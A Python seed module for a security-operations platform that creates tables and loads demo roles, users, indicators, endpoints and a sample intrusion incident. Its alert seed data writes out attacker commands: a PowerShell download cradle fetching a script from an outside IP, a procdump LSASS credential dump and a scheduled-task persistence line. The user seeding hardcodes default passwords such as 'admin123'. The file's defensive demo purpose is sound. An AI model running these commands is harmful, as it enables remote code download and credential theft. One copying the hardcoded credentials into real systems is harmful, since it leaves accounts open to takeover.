import os
from typing import AsyncGenerator
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
from sqlalchemy import select
from loguru import logger
from app.core.config import settings
from app.core.security import get_password_hash
from app.models.models import (
    Base, Role, User, IOCRecord, Endpoint, Alert, Incident, Evidence,
    AuditLog, Approval, SavedHunt, Organization, Site, DeviceGroup
)

# Resolve DB URL with graceful fallback to local SQLite
DB_URL = settings.DATABASE_URL
if not DB_URL:
    db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "skynet.db"))
    DB_URL = f"sqlite+aiosqlite:///{db_path}"

# SQLite requires specific connect_args for multithreading
connect_args = {"check_same_thread": False} if DB_URL.startswith("sqlite") else {}

engine = create_async_engine(
    DB_URL,
    echo=False,
    future=True,
    connect_args=connect_args
)

AsyncSessionLocal = async_sessionmaker(
    bind=engine,
    class_=AsyncSession,
    expire_on_commit=False,
    autoflush=False
)

async def get_db() -> AsyncGenerator[AsyncSession, None]:
    async with AsyncSessionLocal() as session:
        try:
            yield session
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()

async def init_db():
    """Initializes tables, seeds roles, admin user, and sample threat intelligence."""
    logger.info("Initializing database schema...")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with AsyncSessionLocal() as session:
        try:
            # Migrate AuditLog columns if SQLite
            if DB_URL.startswith("sqlite"):
                from sqlalchemy import text
                async with engine.begin() as alter_conn:
                    table_info = await alter_conn.execute(text("PRAGMA table_info(audit_logs)"))
                    existing_cols = {row[1] for row in table_info.fetchall()}
                    new_cols = {
                        "hmac_signature": "VARCHAR(64)",
                        "correlation_id": "VARCHAR(64)",
                        "workflow_id": "VARCHAR(64)",
                        "old_value": "TEXT",
                        "new_value": "TEXT",
                        "result": "VARCHAR(32) DEFAULT 'SUCCESS'"
                    }
                    for col_name, col_def in new_cols.items():
                        if col_name not in existing_cols:
                            await alter_conn.execute(text(f"ALTER TABLE audit_logs ADD COLUMN {col_name} {col_def}"))

                    # Migrate Alert columns if SQLite
                    alert_info = await alter_conn.execute(text("PRAGMA table_info(alerts)"))
                    existing_alert_cols = {row[1] for row in alert_info.fetchall()}
                    new_alert_cols = {
                        "device_id": "VARCHAR(64)",
                        "alert_type": "VARCHAR(64) DEFAULT 'High CPU'",
                        "acknowledged": "BOOLEAN DEFAULT 0",
                        "threat_score": "INTEGER DEFAULT 50"
                    }
                    for col_name, col_def in new_alert_cols.items():
                        if col_name not in existing_alert_cols:
                            await alter_conn.execute(text(f"ALTER TABLE alerts ADD COLUMN {col_name} {col_def}"))

                    # Migrate Endpoint columns if SQLite
                    ep_info = await alter_conn.execute(text("PRAGMA table_info(endpoints)"))
                    existing_ep_cols = {row[1] for row in ep_info.fetchall()}
                    new_ep_cols = {
                        "site_id": "VARCHAR(36)",
                        "tags": "JSON DEFAULT '[]'"
                    }
                    for col_name, col_def in new_ep_cols.items():
                        if col_name not in existing_ep_cols:
                            await alter_conn.execute(text(f"ALTER TABLE endpoints ADD COLUMN {col_name} {col_def}"))

            # Seed 6 Enterprise Roles
            roles_data = [
                ("ADMIN", ["*"]),
                ("SOC_ANALYST", ["alerts:read", "alerts:write", "incidents:read", "incidents:write", "investigations:read", "investigations:write", "hunt:read", "hunt:write"]),
                ("INVESTIGATOR", ["alerts:read", "incidents:read", "investigations:read", "investigations:write", "hunt:read", "assets:read"]),
                ("INCIDENT_RESPONDER", ["alerts:read", "incidents:read", "incidents:write", "soar:execute", "approvals:write", "approvals:read"]),
                ("AUDITOR", ["audit:read", "audit:verify", "compliance:read", "reports:read", "alerts:read", "incidents:read"]),
                ("READ_ONLY", ["alerts:read", "incidents:read", "assets:read", "dashboard:read"]),
                ("L1_ANALYST", ["alerts:read", "alerts:write", "incidents:read", "incidents:write", "soar:execute"]),
                ("THREAT_HUNTER", ["alerts:read", "incidents:read", "threatintel:read"])
            ]
            for role_name, perms in roles_data:
                result = await session.execute(select(Role).where(Role.name == role_name))
                if not result.scalars().first():
                    session.add(Role(name=role_name, permissions=perms))
            await session.commit()

            # Seed Enterprise Users for each role
            users_to_seed = [
                ("admin", "admin@skynet.sec", "ADMIN", settings.ADMIN_INITIAL_PASSWORD or "admin123"),
                ("analyst", "analyst@skynet.sec", "SOC_ANALYST", "AnalystSecure2026!"),
                ("investigator", "investigator@skynet.sec", "INVESTIGATOR", "InvestigatorSecure2026!"),
                ("responder", "responder@skynet.sec", "INCIDENT_RESPONDER", "ResponderSecure2026!"),
                ("auditor", "auditor@skynet.sec", "AUDITOR", "AuditorSecure2026!"),
                ("readonly", "readonly@skynet.sec", "READ_ONLY", "ReadOnlySecure2026!")
            ]
            for uname, uemail, rname, pwd in users_to_seed:
                r_res = await session.execute(select(Role).where(Role.name == rname))
                role_obj = r_res.scalars().first()
                if role_obj:
                    u_res = await session.execute(select(User).where(User.username == uname))
                    if not u_res.scalars().first():
                        session.add(User(
                            username=uname,
                            email=uemail,
                            hashed_password=get_password_hash(pwd),
                            role_id=role_obj.id,
                            status="ACTIVE"
                        ))
            await session.commit()
            logger.info("Enterprise RBAC roles and users seeded.")

            # Cryptographically seal all audit log entries with authentic HMAC signatures
            from app.core.security import generate_audit_hmac
            audit_records = (await session.execute(select(AuditLog))).scalars().all()
            for al in audit_records:
                al.hmac_signature = generate_audit_hmac(
                    actor=al.actor,
                    action=al.action,
                    resource_type=al.resource_type,
                    resource_id=al.resource_id
                )
            await session.commit()

            # Seed Sample IOCs
            sample_iocs = [
                ("IP", "185.220.101.5", 98, "Cobalt Strike C2", "AbuseIPDB", ["c2", "tor-exit"]),
                ("IP", "45.154.255.88", 92, "LockBit Ransomware", "VirusTotal", ["ransomware", "botnet"]),
                ("SHA256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", 0, "Clean File", "VirusTotal", ["clean"]),
                ("SHA256", "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", 99, "Mimikatz LSASS Stealer", "VirusTotal", ["trojan", "credential-theft"]),
                ("DOMAIN", "update-microsoft-verify.top", 95, "Phishing / C2", "URLhaus", ["phishing", "c2"])
            ]
            for ioc_type, val, score, family, src, tags in sample_iocs:
                result = await session.execute(select(IOCRecord).where(IOCRecord.ioc_value == val))
                if not result.scalars().first():
                    session.add(IOCRecord(
                        ioc_type=ioc_type,
                        ioc_value=val,
                        threat_score=score,
                        malware_family=family,
                        source=src,
                        tags=tags
                    ))

            # Seed Endpoints Fleet
            endpoints_data = [
                ("SEC-WS-001", "192.168.1.105", "Windows", "11 Pro x64", "Workstation", 24.5, 68.2, 42.0, "ONLINE"),
                ("DC-PRIMARY-01", "192.168.1.10", "Windows", "Server 2022 Datacenter", "Server", 45.2, 82.1, 55.4, "WARNING"),
                ("FIN-LAPTOP-042", "192.168.1.188", "Windows", "11 Enterprise", "Laptop", 88.0, 94.5, 78.2, "COMPROMISED"),
                ("PAYROLL-DB-02", "192.168.2.50", "Ubuntu Linux", "22.04 LTS", "Server", 18.3, 44.0, 62.1, "ONLINE"),
                ("CORP-GATEWAY-FW", "192.168.1.1", "FreeBSD", "pfsense 2.7", "Server", 12.0, 31.5, 20.0, "ONLINE"),
                ("DEV-BUILD-RUNNER", "192.168.3.112", "Debian", "12 Bookworm", "Server", 91.2, 89.0, 84.5, "ONLINE"),
                ("EXEC-MACBOOK-07", "192.168.1.99", "macOS", "Sonoma 14.5", "Laptop", 15.0, 52.0, 35.0, "ONLINE"),
            ]
            for hname, ip, os_n, os_v, dtype, cpu, mem, disk, st in endpoints_data:
                res = await session.execute(select(Endpoint).where(Endpoint.hostname == hname))
                if not res.scalars().first():
                    session.add(Endpoint(
                        hostname=hname,
                        ip_address=ip,
                        os_name=os_n,
                        os_version=os_v,
                        device_type=dtype,
                        cpu_usage=cpu,
                        memory_usage=mem,
                        disk_usage=disk,
                        status=st,
                        agent_version="1.0.0"
                    ))
            await session.commit()

            # Seed Sample Incident with Alerts & Evidence
            inc_res = await session.execute(select(Incident).where(Incident.incident_number == "INC-2026-0001"))
            existing_inc = inc_res.scalars().first()
            if not existing_inc:
                sample_inc = Incident(
                    incident_number="INC-2026-0001",
                    title="Cobalt Strike Beacon Infiltration & Credential Dumping",
                    description="Multiple high-severity detections indicating initial ingress via phishing, followed by PowerShell download of Cobalt Strike beacon and LSASS memory dumping on FIN-LAPTOP-042.",
                    severity="CRITICAL",
                    status="INVESTIGATING",
                    verdict="TRUE_POSITIVE",
                    ai_summary="Autonomous Tier-1 triage identified a multi-stage intrusion on FIN-LAPTOP-042. Attacker successfully executed obfuscated PowerShell to download a known C2 beacon communicating with 185.220.101.5. Procdump executed 4 minutes later against lsass.exe.",
                    ai_root_cause="Phishing attachment payload delivered obfuscated PowerShell script bypassing AMSI, downloading second-stage beacon from remote C2 node.",
                    ai_recommended_action="1. Isolate endpoint FIN-LAPTOP-042 via SOAR containment API immediately.\n2. Update border firewall ACL to drop 185.220.101.5.\n3. Invalidate Kerberos TGT and rotate credentials for affected domain user 'finance_lead'.",
                    mitre_tactics=["Execution", "Credential Access", "Command and Control", "Defense Evasion"],
                    mitre_techniques=["T1059.001", "T1003.001", "T1105", "T1071.001"]
                )
                session.add(sample_inc)
                await session.flush()

                # Seed Associated Alerts
                alerts_data = [
                    (
                        "Cobalt Strike C2 Beacon Communication Detected",
                        "Outbound HTTPS beaconing traffic detected to known malicious C2 IP 185.220.101.5 on port 443 with JARM fingerprint match.",
                        "CRITICAL",
                        "IOC_MATCH",
                        "NEW",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1071.001",
                        {"c2_ip": "185.220.101.5", "port": 443, "interval_sec": 30, "jitter": "15%"}
                    ),
                    (
                        "LSASS Memory Dumping Attempt via Procdump",
                        "Process execution: procdump64.exe -ma lsass.exe out.dmp targeting Local Security Authority Subsystem Service.",
                        "CRITICAL",
                        "SIGMA_RULE",
                        "NEW",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1003.001",
                        {"command_line": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "parent_process": "powershell.exe"}
                    ),
                    (
                        "Encoded PowerShell Download Cradle Executed",
                        "Base64 encoded PowerShell execution with Net.WebClient invoking memory-only script execution.",
                        "HIGH",
                        "SIGMA_RULE",
                        "ACKNOWLEDGED",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1059.001",
                        {"script_block": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage.ps1')"}
                    ),
                    (
                        "Unusual Anomaly: High Privileged Kerberos Ticket Request",
                        "Abnormal volume of Kerberos ticket requests (AS-REQ) originating from unauthorized subnet during off-hours.",
                        "MEDIUM",
                        "BEHAVIORAL_ANOMALY",
                        "NEW",
                        "DC-PRIMARY-01",
                        "192.168.1.10",
                        "T1078",
                        {"request_count": 142, "account": "svc_sql_admin"}
                    ),
                    (
                        "Suspicious Scheduled Task Created via Schtasks",
                        "Persistence mechanism detected: schtasks /create /tn 'SystemHealthUpdate' /tr 'powershell -enc ...'",
                        "HIGH",
                        "SIGMA_RULE",
                        "NEW",
                        "SEC-WS-001",
                        "192.168.1.105",
                        "T1053.005",
                        {"task_name": "SystemHealthUpdate", "run_as": "SYSTEM"}
                    )
                ]

                for title, desc, sev, src, stat, hname, hip, m_tech, edata in alerts_data:
                    a = Alert(
                        title=title,
                        description=desc,
                        severity=sev,
                        source=src,
                        status=stat,
                        host_name=hname,
                        host_ip=hip,
                        mitre_technique=m_tech,
                        event_data=edata,
                        incident_id=sample_inc.id if hname == "FIN-LAPTOP-042" else None
                    )
                    session.add(a)

                # Seed Evidence for Incident
                ev1 = Evidence(
                    incident_id=sample_inc.id,
                    evidence_type="PROCESS_LOG",
                    raw_payload={
                        "process_name": "powershell.exe",
                        "pid": 4820,
                        "parent_pid": 1104,
                        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
                        "timestamp": "2026-09-25T13:42:10Z"
                    },
                    hash_sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                    notes="Obfuscated PowerShell invocation launching secondary stage loader."
                )
                ev2 = Evidence(
                    incident_id=sample_inc.id,
                    evidence_type="NETWORK_FLOW",
                    raw_payload={
                        "src_ip": "192.168.1.188",
                        "src_port": 51240,
                        "dst_ip": "185.220.101.5",
                        "dst_port": 443,
                        "proto": "TCP",
                        "bytes_out": 4210,
                        "bytes_in": 128450
                    },
                    hash_sha256=None,
                    notes="Persistent beaconing flow matching Cobalt Strike malleable C2 profile."
                )
                session.add(ev1)
                session.add(ev2)

                # Seed Sample Audit Logs
                sample_audits = [
                    ("SOC AI Agent", "SOAR_ISOLATE_HOST", "CONTAINMENT", "FIN-LAPTOP-042", {"reason": "Active C2 beacon containment recommended by Tier-1 agent"}),
                    ("admin", "LOGIN", "AUTH", "admin", {"client_ip": "127.0.0.1"}),
                    ("SOC AI Agent", "INCIDENT_TRIAGED", "INCIDENT", "INC-2026-0001", {"status": "INVESTIGATING", "verdict": "TRUE_POSITIVE"})
                ]
                for actor, act, rtype, rid, payload in sample_audits:
                    session.add(AuditLog(
                        actor=actor,
                        action=act,
                        resource_type=rtype,
                        resource_id=rid,
                        payload=payload,
                        client_ip="127.0.0.1"
                    ))

            # Seed Default Pending Approvals (Human-in-the-Loop Safeguards)
            sample_approvals = [
                (
                    "ISOLATE_HOST",
                    "WS-182",
                    "192.168.1.188",
                    "INC-10482",
                    96,
                    "Active outbound C2 beacon communication detected to 185.220.101.5 on port 443 with credential theft attempt.",
                    "17 correlated events, 4 Sigma rules matched, Procdump LSASS hash match.",
                    "SIGMA-WIN-001 & IOC-MATCH",
                    "Autonomous Tier-1 SOAR Engine",
                    "Disable physical and virtual network adapters on WS-182 except for encrypted agent management channel.",
                    "Re-enable adapters via agent command Enable-NetAdapter upon forensic sign-off."
                ),
                (
                    "DISABLE_ACCOUNT",
                    "USER-421 (finance_lead)",
                    "Active Directory / Entra ID",
                    "INC-10482",
                    88,
                    "Compromised identity: 7 consecutive failed authentications followed by impossible travel anomaly from RU.",
                    "Event 4625 burst, Okta push timeout rejected, Kerberos ticket requested from anomalous IP.",
                    "SIGMA-WIN-007 (Brute Force Anomaly)",
                    "UEBA Behavioral Anomaly Engine",
                    "Revoke active Kerberos TGT and invalidate Microsoft Entra ID refresh tokens immediately.",
                    "Admin account unlock and password reset with hardware MFA re-enrollment."
                ),
                (
                    "BLOCK_IP",
                    "185.220.101.5:443",
                    "Perimeter Palo Alto & AWS Security Groups",
                    "INC-10482",
                    94,
                    "Threat Intelligence IOC match: Confirmed Cobalt Strike C2 server with VirusTotal 68/88 malicious rating.",
                    "Outbound TCP connection attempts and DNS sinkhole match for update-microsoft-verify.top.",
                    "IOC-MATCH-001 (Cobalt Strike C2)",
                    "Threat Intelligence Ingestion Pipeline",
                    "Inject DROP rule at top of perimeter ingress/egress firewall ACL policy.",
                    "Remove IP from dynamic firewall address-group."
                )
            ]
            for act_type, tgt, tgt_ip, inc_id, risk, reason, evid, det, req_by, exact, rollback in sample_approvals:
                res_apv = await session.execute(select(Approval).where(Approval.target == tgt, Approval.status == "PENDING"))
                if not res_apv.scalars().first():
                    session.add(Approval(
                        action_type=act_type,
                        target=tgt,
                        target_ip=tgt_ip,
                        incident_id=inc_id,
                        risk_score=risk,
                        reason=reason,
                        evidence=evid,
                        detection=det,
                        requested_by=req_by,
                        exact_action=exact,
                        rollback_plan=rollback,
                        status="PENDING"
                    ))

            # Seed Default Saved Hunts
            sample_hunts = [
                ("Cobalt Strike C2 Hunting", 'process.name = "powershell.exe" AND network.destination_ip IN threat_intel.malicious_ips', "T1071.001"),
                ("LSASS Memory Dumping Sweep", 'process.command_line LIKE "%lsass%" OR process.name = "procdump64.exe"', "T1003.001"),
                ("Ransomware Shadow Deletion", 'process.name = "vssadmin.exe" AND process.command_line LIKE "%delete shadows%"', "T1490"),
                ("Privileged Account Logon Bursts", 'event.code = 4625 AND user.is_privileged = true GROUP BY user.name HAVING count() > 5', "T1110"),
            ]
            for hname, qry, mitre_t in sample_hunts:
                res_hnt = await session.execute(select(SavedHunt).where(SavedHunt.name == hname))
                if not res_hnt.scalars().first():
                    session.add(SavedHunt(
                        name=hname,
                        query=qry,
                        mitre_technique=mitre_t,
                        author="admin"
                    ))

            # Seed Multi-Site Hierarchy
            org_res = await session.execute(select(Organization).where(Organization.slug == "skynet-corp"))
            org = org_res.scalars().first()
            if not org:
                org = Organization(
                    name="SKYNET Global Enterprise",
                    slug="skynet-corp"
                )
                session.add(org)
                await session.flush()

            sites_data = [
                ("Headquarters", "HQ-NYC", "New York, USA", 40.7128, -74.0060, "America/New_York"),
                ("Primary Data Center", "DC-FRA", "Frankfurt, Germany", 50.1109, 8.6821, "Europe/Berlin"),
                ("Branch Office A", "BR-LON", "London, UK", 51.5074, -0.1278, "Europe/London"),
                ("Branch Office B", "BR-TYO", "Tokyo, Japan", 35.6762, 139.6503, "Asia/Tokyo")
            ]
            site_map = {}
            for sname, scode, sloc, slat, slon, stz in sites_data:
                s_res = await session.execute(select(Site).where(Site.code == scode))
                s_obj = s_res.scalars().first()
                if not s_obj:
                    s_obj = Site(
                        organization_id=org.id,
                        name=sname,
                        code=scode,
                        location=sloc,
                        latitude=slat,
                        longitude=slon,
                        timezone=stz
                    )
                    session.add(s_obj)
                    await session.flush()
                site_map[scode] = s_obj

            # Seed Device Groups
            groups_data = [
                ("HQ-NYC", "Corporate Workstations", "Executive and developer laptops in NYC HQ"),
                ("DC-FRA", "Core Infrastructure & DB", "High-throughput database nodes & kubernetes runners"),
                ("BR-LON", "Branch Office Edge", "Local branch file servers and endpoint PCs"),
                ("BR-TYO", "Logistics & Android Fleet", "Mobile telemetry gateways and tablets")
            ]
            for scode, gname, gdesc in groups_data:
                if scode in site_map:
                    g_res = await session.execute(
                        select(DeviceGroup).where(DeviceGroup.site_id == site_map[scode].id, DeviceGroup.name == gname)
                    )
                    if not g_res.scalars().first():
                        session.add(DeviceGroup(
                            site_id=site_map[scode].id,
                            name=gname,
                            description=gdesc
                        ))

            # Associate existing endpoints to sites and assign tags
            endpoints_list = (await session.execute(select(Endpoint))).scalars().all()
            for i, ep in enumerate(endpoints_list):
                if not ep.site_id and site_map:
                    assigned_code = list(site_map.keys())[i % len(site_map)]
                    ep.site_id = site_map[assigned_code].id
                    ep.tags = ["prod", assigned_code.lower(), ep.device_type.lower()]

            await session.commit()
            logger.info("Database initialization and seed records completed successfully.")
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            await session.rollback()

